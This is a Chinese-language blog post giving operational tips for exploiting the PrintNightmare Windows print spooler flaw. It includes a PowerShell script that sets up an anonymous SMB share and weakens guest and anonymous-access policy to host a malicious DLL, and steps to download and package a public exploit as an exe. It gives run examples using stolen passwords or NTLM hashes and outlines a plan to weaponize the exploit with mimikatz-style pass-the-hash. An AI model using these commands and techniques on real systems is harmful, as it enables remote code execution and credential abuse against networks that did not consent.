---
title: PrintNightmare 实战利用Tips
date: 2022-11-13 3:34:50
categories: 
- Develop
tags:
- 0/N Day
- PrintNightmare
- CVE-2021-1675
- CVE-2021-34527
---
# **概述**

**CVE-2021-1675 / CVE-2021-34527 这两个洞本质上就是一个洞，只是因为修复的问题分配了两个编号。具体的漏洞分析就不赘述了，很早就有人发过，没必要炒冷饭，这里只总结下实际使用时可能出现的问题，以及很多poc中不会提到的细节**

# 复现攻击环境

## 注意事项

### 1.域相关

目标机器为域内Windows Server机器时，攻击机必须为同一域内的机器；目标机器为非域环境Windows Server机器时，攻击机器为目标机器可以访问到的另一机器即可

> 加入域后的Windows系统访问外部资源会携带已登录的域用户凭证，所以未加入域且未提前指定凭据的的SMB就无法访问。因此攻击域内机器有此限制

### 2.SMBv1

攻击机器为Windows Server 2019及更高版本时，需要执行 `Enable-WindowsOptionalFeature -Online -FeatureName smb1protocol`并重启去开启SMBv1，否则有可能出现rpc_s_access_denied的问题，攻击机器为2016及更低版本的系统时，可以直接使用 `Set-SmbServerConfiguration -EnableSMB1Protocol $true`开启SMBv1的支持

## 步骤

### 1.准备payload

在攻击机器创建C:\share文件夹，并将dll放入其中（此路径可根据需求修改，修改后下一步脚本自行对应修改）

### 2.开启SMB匿名共享

```powershell

#修改路径权限，使所有人可读
icacls C:\share\ /T /grant Anonymous` logon:F
icacls C:\share\ /T /grant Everyone:F
#创建名称为share路径为C:\share的SMB共享
New-SmbShare -Path C:\share -Name share -FullAccess 'ANONYMOUS LOGON','Everyone'
#启用guest用户
net user guest /active:yes
#覆盖已有的NullSessionPipes配置
REG ADD "HKLM\System\CurrentControlSet\Services\LanManServer\Parameters" /v NullSessionPipes /t REG_MULTI_SZ /d srvsvc /f
#设置可以匿名访问共享
REG ADD "HKLM\System\CurrentControlSet\Services\LanManServer\Parameters" /v NullSessionShares /t REG_MULTI_SZ /d share /f
#设置Everyone权限包含匿名登录用户
REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v EveryoneIncludesAnonymous /t REG_DWORD /d 1 /f
#设置任何用户都可以通过网络获取本机的信息
REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v RestrictAnonymous /t REG_DWORD /d 0 /f
#提取本地安全组策略
secedit /export /cfg gp.inf /quiet
#修改组策略中的指定权限
(Get-Content gp.inf) -replace "SeDenyNetworkLogonRight = Guest","SeDenyNetworkLogonRight = " | Set-Content "gp.inf"
#导入本地安全组策略
secedit /configure /db gp.sdb /cfg gp.inf /quiet
#更新本地安全组策略
CMD.EXE /C "gpupdate/force"
#清理文件
CMD.EXE /C "del gp.inf"
CMD.EXE /C "del gp.sdb"
```

注：此脚本修改自[Invoke-BuildAnonymousSMBServer](https://github.com/3gstudent/Invoke-BuildAnonymousSMBServer)

### 3.准备exp

#### 选择exp

推荐exp为[CVE-2021-1675.py](https://github.com/cube0x0/CVE-2021-1675/blob/main/CVE-2021-1675.py)，主要优势在于可以使用hash进行攻击，现在越来越难搞到密码了，hash的场景更多

因为大部分目标环境不会有python环境，所以最好打包为exe使用

#### 打包exe

打包使用Windows Server 2008 R2机器，安装[Python3.8](https://www.python.org/ftp/python/3.8.10/python-3.8.10-amd64.exe)，[Git](https://github.com/git-for-windows/git/releases/download/v2.38.1.windows.1/Git-2.38.1-64-bit.exe)，之后执行以下命令

> *Windows Server 2008 R2以保证大部分系统能正常运行，Python版本推荐3.8.10，可低不可高*

```bash
git clone https://github.com/cube0x0/impacket
cd impacket
certutil -urlcache -split -f https://raw.githubusercontent.com/cube0x0/CVE-2021-1675/main/CVE-2021-1675.py CVE-2021-1675.py
pip3 install six pycryptodomex pyasn1 pyinstaller
pyinstaller --clean --onefile CVE-2021-1675.py
```

生成的文件在 `\impacket\dist\CVE-2021-1675.exe`

### 4.执行

示例：

```bash
CVE-2021-1675.exe hackit.local/domain_user:Pass123@192.168.1.10 "\\192.168.1.215\share\addCube.dll"

CVE-2021-1675.exe hackit.local/domain_user:Pass123@192.168.1.10 "\\192.168.1.215\share\addCube.dll" "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL"

CVE-2021-1675.exe hackit.local/domain_user@192.168.1.10 -hashes :f0cff78ea8d2d87e5d1caccf01d0bd2f "\\192.168.1.215\share\addCube.dll"

CVE-2021-1675.exe hackit.local/domain_user@192.168.1.10 -hashes :f0cff78ea8d2d87e5d1caccf01d0bd2f "\\192.168.1.215\share\addCube.dll" "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL"

CVE-2021-1675.exe domain_user:Pass123@192.168.1.10 "\\192.168.1.215\share\addCube.dll"

CVE-2021-1675.exe domain_user:Pass123@192.168.1.10 "\\192.168.1.215\share\addCube.dll" "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL"

CVE-2021-1675.exe domain_user@192.168.1.10 -hashes :f0cff78ea8d2d87e5d1caccf01d0bd2f "\\192.168.1.215\share\addCube.dll"

CVE-2021-1675.exe domain_user@192.168.1.10 -hashes :f0cff78ea8d2d87e5d1caccf01d0bd2f "\\192.168.1.215\share\addCube.dll" "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL"
```

# 武器化思路

按照上文的方法已经足够应付大多数攻击场景了，但是如果从武器化开发的角度来看，pyinstaller这东西还是太不优雅了，所以我们回头看向了另一份poc，[SharpPrintNightmare](https://github.com/cube0x0/CVE-2021-1675/tree/main/SharpPrintNightmare/SharpPrintNightmare)，对这份代码稍作修改即可实现使用hash验证身份的功能

## 1.背景介绍

Pass The Hash这项技术实现起来，有两种思路，一种是自己构造包然后发包完成验证，另一种是修改自己进程或线程内存中保存的身份验证信息并修改。

## 2.确定思路

为了方便开发，这里选用第二种方法。毕竟去翻RPC和SMB的文档是一个很让人头疼的事……

而第二种方法的典型案例就是mimikatz，所以首先使用mimikatz进行简单的测试

```text
sekurlsa::pth /user:John /domain:192.168.0.111 /ntlm:f0cff78ea8d2d87e5d1caccf01d0bd2f /run:"SharpPrintNightmare.exe"

注：为了方便测试，此处我已经修改SharpPrintNightmare代码，并写死了参数
```

可以发现思路可行，确定了patch的方案

mimikatz有一个C#的版本[SharpKatz](https://github.com/b4rtik/SharpKatz)，~~抄袭~~参考其中pth功能的实现代码即可

SharpKatz中的此部分代码基本完全由mimikatz的代码翻译而成，建议先看其中任意一个的代码了解下原理。

总结后需要对SharpPrintNightmare进行的修改为：

* 添加pth选项，进行参数判断
* 修改原项目的Impersonator类，如果使用pth就不再执行LogonUser函数，改为使用SharpKatz中的pth模块的[CreateProcess](https://github.com/b4rtik/SharpKatz/blob/87e8e6661999d19bbcae3c0623f78dc2a1a9b45f/SharpKatz/Module/Pth.cs#L34)函数（此处需要将SharpKatz的对应代码集成进来），注意将impersonate设置为true，以便使用当前线程去连接，而不是使用新进程（方便内存加载）
* [SharpKatz](https://github.com/b4rtik/SharpKatz)的pth中所需的内存查找的特征不全，需要参考mimikatz中的补全

确定了以上修改方案，再完善一下使用细节，以及对应的文本提示与错误反馈即可完成工具的武器化

## 3.成果

因为各种原因，就不放成品了，有兴趣的可以自己按照步骤修改一遍啦
